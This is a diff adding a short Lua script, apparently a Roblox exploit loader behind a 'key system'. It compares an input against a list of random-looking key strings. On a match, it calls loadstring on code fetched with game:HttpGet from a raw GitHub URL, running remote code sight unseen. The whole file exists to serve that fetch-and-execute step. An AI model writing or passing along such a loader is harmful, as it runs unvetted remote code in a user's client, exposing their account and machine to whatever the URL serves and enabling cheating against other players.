@@ -1,0 +1,30 @@
+_G.Input = "key 1"
+for _,v in pairs({
+    "hB1!0+%=uJbW4kHH+m#H1E[AAawTOd]u-+d(t9eg'w'{H1=@Hd",
+    ".flSfCGw8kFq_w^'RXme9Hm43oSq;!)gnaNoIPI8dLURbZKgKE",
+    "W+&WUfVe)u,95~AlZ^I[WR9^p3&}cOl[;UWQL6SJEVEppWWp;P",
+    "DauAOk{G(]+#BVIcbu45vOGZlggGma'IO~Dcy)ESGS6Uq%(CX%",
+    "FVFc}}KG@1ev%#A@.J~lvx,u#u5m5p$vOD;l=DEItbIRL2JJ4^",
+	"oqXAkFp4f#7Mr{so0Jm!z{J%ibf~W!$rpuXCLet!VeS7lHf='y!",
+	"UzWi}MP56K#yIBiWZ_wir%;U_e22lQRc%qY=l5ZbQl0=d;NlL{",
+    "ITy!hbq_3GC-3#2+c,Ss,q+$x4(i~&(1i0$@8u_{'I,]BKh_4-",
+	"nv$Ci7!kt)X}nMn@Fo&1{8_AiEt{JZu3sr;jnA=a'w$=VHhvy(",
+	"HbjgDvlQ13'6XN!wd#BI~cu7CRRyCq_&9b,C5,A57FHoU'Dm,^",
+	"cIL7&4}$ES#'=bKSDWSO)I1qQpY}PwJTml8+(}3GPwJc4+B2zB",
+	"ly^[03du)&{yv8!tb-gdQPPNAD}8z[F4YKoF&CnM!_ynNb_qxJ",
+	"o&MI];R7xzB&8MbJ_CS%[uBW3Pho8QR(+&Q9@OGrBZz8rdw-]#",
+	",bw$U%iDu}yVr=G7c!arw)4{m8&1R=zRV}jIL;qcj&grnpL7xY",
+	"#iQZ2,Q5jiHe#rz.S3@U$w'L;}tDD6MIa3EuqcwroI7[.Eb&wl",
+	"}^]wlOPTvYsGXiK!9Ndi_dG=%%jhAvMWMVrr5D5@wY~uQq+mo3",
+	"6wS@iRfRekHlH#[pZBPH1@;;dfWy+Xy9'[LOFi;QeJ!4xC6cij",
+	"eh]=R#_5mcfSZb,nO9ynZw{BEUW43W!o=f2[!WkNRA@&!23h)g",
+	"XC_;uo8W+aeCDKp2^Kw1Nf@-E~xjw@u=3nc!$4M)jZ4JYb5l1,",
+	"&$M#2Jxn[8#';m)QlG%N-R4LpC&JV8%2b_5tT'28g29Povu9dc",
+	"eyEqK.r{T{Q(;bj4W&^us$%ckWcakT%J(47gX#o'AZB8PnWb.Q",
+	"(MRkO.zG[54n_n7U!o4B,V4@ZA=DWpgg$DuUvW^jVHfr8R+Wu6",
+}) do
+    if v == _G.Input then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ozcc313/fefefefeffffffffffffffff/main/fefeff'))()
+    end
+end
+
